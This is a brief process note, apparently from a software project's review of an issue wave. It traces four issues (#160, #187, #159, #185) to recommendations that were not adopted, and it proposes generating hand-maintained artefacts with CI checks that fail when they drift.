**A note on process.** Wave 9 closed with two recommendations — require a failing-first test in any PR that closes an issue, and grep for the contract method before closing a UI issue. Neither was adopted. Four of this wave's issues are the direct result: #160 (no test crosses the schema-to-storage boundary, so five fields could be collected and dropped without a single assertion failing), #187 (a duplicated JSX mount, invisible to lint, type-check, and 241 passing tests), #159 (a hand-fixed copy-paste that the next contributor will duplicate), and #185 (an enum that grew and a hand-maintained map that did not). The pattern is consistent enough to be worth one issue of its own next wave: **every artefact that is maintained by hand and consumed by another artefact should be generated, and CI should fail when the generator and the artefact disagree.** `scripts/generate_events_doc.py --check` already does this for events. Extending it to error enums, bindings, and the tracked-topic list would have caught five of the issues in this document at the point they were written.
